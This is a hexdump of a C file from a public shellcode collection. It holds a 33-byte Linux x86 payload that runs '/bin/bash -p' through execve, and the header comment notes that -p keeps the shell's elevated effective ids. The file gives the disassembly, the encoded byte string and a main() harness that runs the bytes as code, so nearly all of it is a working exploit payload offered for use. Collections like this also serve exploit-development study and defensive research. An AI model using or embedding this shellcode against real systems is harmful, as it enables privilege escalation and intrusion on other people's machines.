00000000  2f 2a 0a 0a 54 69 74 6c  65 3a 20 09 4c 69 6e 75  |/*..Title: .Linu|
00000010  78 20 78 38 36 20 2d 20  65 78 65 63 76 65 28 22  |x x86 - execve("|
00000020  2f 62 69 6e 2f 62 61 73  68 22 2c 20 5b 22 2f 62  |/bin/bash", ["/b|
00000030  69 6e 2f 62 61 73 68 22  2c 20 22 2d 70 22 5d 2c  |in/bash", "-p"],|
00000040  20 4e 55 4c 4c 29 20 2d  20 33 33 20 62 79 74 65  | NULL) - 33 byte|
00000050  73 0a 41 75 74 68 6f 72  3a 09 4a 6f 6e 61 74 68  |s.Author:.Jonath|
00000060  61 6e 20 53 61 6c 77 61  6e 0a 4d 61 69 6c 3a 09  |an Salwan.Mail:.|
00000070  73 75 62 6d 69 74 40 73  68 65 6c 6c 2d 73 74 6f  |submit@shell-sto|
00000080  72 6d 2e 6f 72 67 0a 57  65 62 3a 09 68 74 74 70  |rm.org.Web:.http|
00000090  3a 2f 2f 77 77 77 2e 73  68 65 6c 6c 2d 73 74 6f  |://www.shell-sto|
000000a0  72 6d 2e 6f 72 67 0a 0a  21 44 61 74 61 62 61 73  |rm.org..!Databas|
000000b0  65 20 6f 66 20 53 68 65  6c 6c 63 6f 64 65 73 20  |e of Shellcodes |
000000c0  68 74 74 70 3a 2f 2f 77  77 77 2e 73 68 65 6c 6c  |http://www.shell|
000000d0  2d 73 74 6f 72 6d 2e 6f  72 67 2f 73 68 65 6c 6c  |-storm.org/shell|
000000e0  63 6f 64 65 2f 0a 0a 0a  73 68 20 73 65 74 73 20  |code/...sh sets |
000000f0  28 65 75 69 64 2c 20 65  67 69 64 29 20 74 6f 20  |(euid, egid) to |
00000100  28 75 69 64 2c 20 67 69  64 29 20 69 66 20 2d 70  |(uid, gid) if -p|
00000110  20 6e 6f 74 20 73 75 70  70 6c 69 65 64 20 61 6e  | not supplied an|
00000120  64 20 75 69 64 20 3c 20  31 30 30 0a 52 65 61 64  |d uid < 100.Read|
00000130  20 6d 6f 72 65 3a 20 68  74 74 70 3a 2f 2f 77 77  | more: http://ww|
00000140  77 2e 66 61 71 73 2e 6f  72 67 2f 66 61 71 73 2f  |w.faqs.org/faqs/|
00000150  75 6e 69 78 2d 66 61 71  2f 73 68 65 6c 6c 2f 62  |unix-faq/shell/b|
00000160  61 73 68 2f 23 69 78 7a  7a 30 6d 7a 50 6d 4a 43  |ash/#ixzz0mzPmJC|
00000170  34 39 0a 0a 73 61 73 73  65 6d 62 6c 79 20 6f 66  |49..sassembly of|
00000180  20 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 3a 0a  | section .text:.|
00000190  0a 30 38 30 34 38 30 35  34 20 3c 2e 74 65 78 74  |.08048054 <.text|
000001a0  3e 3a 0a 20 38 30 34 38  30 35 34 3a 09 36 61 20  |>:. 8048054:.6a |
000001b0  30 62 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0b              |
000001c0  20 20 09 70 75 73 68 20  20 20 24 30 78 62 0a 20  |  .push   $0xb. |
000001d0  38 30 34 38 30 35 36 3a  09 35 38 20 20 20 20 20  |8048056:.58     |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
000001f0  6f 70 20 20 20 20 25 65  61 78 0a 20 38 30 34 38  |op    %eax. 8048|
00000200  30 35 37 3a 09 39 39 20  20 20 20 20 20 20 20 20  |057:.99         |
00000210  20 20 20 20 20 20 20 20  20 20 09 63 6c 74 64 20  |          .cltd |
00000220  20 20 0a 20 38 30 34 38  30 35 38 3a 09 35 32 20  |  . 8048058:.52 |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000240  20 20 09 70 75 73 68 20  20 20 25 65 64 78 0a 20  |  .push   %edx. |
00000250  38 30 34 38 30 35 39 3a  09 36 36 20 36 38 20 32  |8048059:.66 68 2|
00000260  64 20 37 30 20 20 20 20  20 20 20 20 20 20 09 70  |d 70          .p|
00000270  75 73 68 77 20 20 24 30  78 37 30 32 64 0a 20 38  |ushw  $0x702d. 8|
00000280  30 34 38 30 35 64 3a 09  38 39 20 65 31 20 20 20  |04805d:.89 e1   |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 09 6d 6f  |             .mo|
000002a0  76 20 20 20 20 25 65 73  70 2c 25 65 63 78 0a 20  |v    %esp,%ecx. |
000002b0  38 30 34 38 30 35 66 3a  09 35 32 20 20 20 20 20  |804805f:.52     |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
000002d0  75 73 68 20 20 20 25 65  64 78 0a 20 38 30 34 38  |ush   %edx. 8048|
000002e0  30 36 30 3a 09 36 61 20  36 38 20 20 20 20 20 20  |060:.6a 68      |
000002f0  20 20 20 20 20 20 20 20  20 20 09 70 75 73 68 20  |          .push |
00000300  20 20 24 30 78 36 38 0a  20 38 30 34 38 30 36 32  |  $0x68. 8048062|
00000310  3a 09 36 38 20 32 66 20  36 32 20 36 31 20 37 33  |:.68 2f 62 61 73|
00000320  20 20 20 20 20 20 20 09  70 75 73 68 20 20 20 24  |       .push   $|
00000330  30 78 37 33 36 31 36 32  32 66 0a 20 38 30 34 38  |0x7361622f. 8048|
00000340  30 36 37 3a 09 36 38 20  32 66 20 36 32 20 36 39  |067:.68 2f 62 69|
00000350  20 36 65 20 20 20 20 20  20 20 09 70 75 73 68 20  | 6e       .push |
00000360  20 20 24 30 78 36 65 36  39 36 32 32 66 0a 20 38  |  $0x6e69622f. 8|
00000370  30 34 38 30 36 63 3a 09  38 39 20 65 33 20 20 20  |04806c:.89 e3   |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 09 6d 6f  |             .mo|
00000390  76 20 20 20 20 25 65 73  70 2c 25 65 62 78 0a 20  |v    %esp,%ebx. |
000003a0  38 30 34 38 30 36 65 3a  09 35 32 20 20 20 20 20  |804806e:.52     |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
000003c0  75 73 68 20 20 20 25 65  64 78 0a 20 38 30 34 38  |ush   %edx. 8048|
000003d0  30 36 66 3a 09 35 31 20  20 20 20 20 20 20 20 20  |06f:.51         |
000003e0  20 20 20 20 20 20 20 20  20 20 09 70 75 73 68 20  |          .push |
000003f0  20 20 25 65 63 78 0a 20  38 30 34 38 30 37 30 3a  |  %ecx. 8048070:|
00000400  09 35 33 20 20 20 20 20  20 20 20 20 20 20 20 20  |.53             |
00000410  20 20 20 20 20 20 09 70  75 73 68 20 20 20 25 65  |      .push   %e|
00000420  62 78 0a 20 38 30 34 38  30 37 31 3a 09 38 39 20  |bx. 8048071:.89 |
00000430  65 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e1              |
00000440  20 20 09 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |  .mov    %esp,%|
00000450  65 63 78 0a 20 38 30 34  38 30 37 33 3a 09 63 64  |ecx. 8048073:.cd|
00000460  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
00000470  20 20 20 09 69 6e 74 20  20 20 20 24 30 78 38 30  |   .int    $0x80|
00000480  0a 0a 2a 2f 0a 0a 23 69  6e 63 6c 75 64 65 20 3c  |..*/..#include <|
00000490  73 74 64 69 6f 2e 68 3e  0a 0a 63 68 61 72 20 73  |stdio.h>..char s|
000004a0  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 20 22 5c 78  |hellcode[] = "\x|
000004b0  36 61 5c 78 30 62 5c 78  35 38 5c 78 39 39 5c 78  |6a\x0b\x58\x99\x|
000004c0  35 32 5c 78 36 36 5c 78  36 38 5c 78 32 64 5c 78  |52\x66\x68\x2d\x|
000004d0  37 30 5c 78 38 39 5c 78  65 31 5c 78 35 32 5c 78  |70\x89\xe1\x52\x|
000004e0  36 61 5c 78 36 38 5c 78  36 38 5c 78 32 66 5c 78  |6a\x68\x68\x2f\x|
000004f0  36 32 5c 78 36 31 5c 78  37 33 5c 78 36 38 5c 78  |62\x61\x73\x68\x|
00000500  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  |2f\x62\x69\x6e\x|
00000510  38 39 5c 78 65 33 5c 78  35 32 5c 78 35 31 5c 78  |89\xe3\x52\x51\x|
00000520  35 33 5c 78 38 39 5c 78  65 31 5c 78 63 64 5c 78  |53\x89\xe1\xcd\x|
00000530  38 30 22 3b 0a 0a 69 6e  74 20 6d 61 69 6e 28 69  |80";..int main(i|
00000540  6e 74 20 61 72 67 63 2c  20 63 68 61 72 20 2a 61  |nt argc, char *a|
00000550  72 67 76 5b 5d 29 0a 7b  0a 20 20 20 20 20 20 20  |rgv[]).{.       |
00000560  09 66 70 72 69 6e 74 66  28 73 74 64 6f 75 74 2c  |.fprintf(stdout,|
00000570  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
00000580  74 72 6c 65 6e 28 73 68  65 6c 6c 63 6f 64 65 29  |trlen(shellcode)|
00000590  29 3b 0a 09 28 2a 28 76  6f 69 64 28 2a 29 28 29  |);..(*(void(*)()|
000005a0  29 20 73 68 65 6c 6c 63  6f 64 65 29 28 29 3b 20  |) shellcode)(); |
000005b0  20 20 20 20 20 20 0a 7d                           |      .}|
000005b8
